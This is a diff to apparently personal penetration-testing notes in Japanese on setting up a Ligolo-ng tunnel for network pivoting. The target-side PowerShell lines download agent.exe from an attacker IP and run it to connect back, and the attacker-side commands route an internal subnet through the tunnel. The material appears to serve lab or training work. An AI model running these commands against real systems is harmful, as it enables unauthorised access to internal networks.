@@ -1,7 +1,22 @@
 # Tunnelの整備
 
-- 
+- [Ligolo-ng relase - GitHub](https://github.com/nicocha30/ligolo-ng/releases)を使用
+```sh
+# Attacker
+sudo ip tuntap add user koshi mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 172.16.104.0/24 dev ligolo
+ligolo-proxy -selfcert -laddr 0.0.0.0:1337
+```
 
+```powershell
+# Target
+cd ~
+iwr -uri http://192.168.49.104:8888/agent.exe -Outfile .\agent.exe
+.\agent.exe -connect 192.168.49.104:1337 -ignore-cert
+
+```
+![[Pasted image 20260222183730.png]]
 # Local
 
 ## Auto w/ [Seatbelt](https://github.com/GhostPack/Seatbelt)
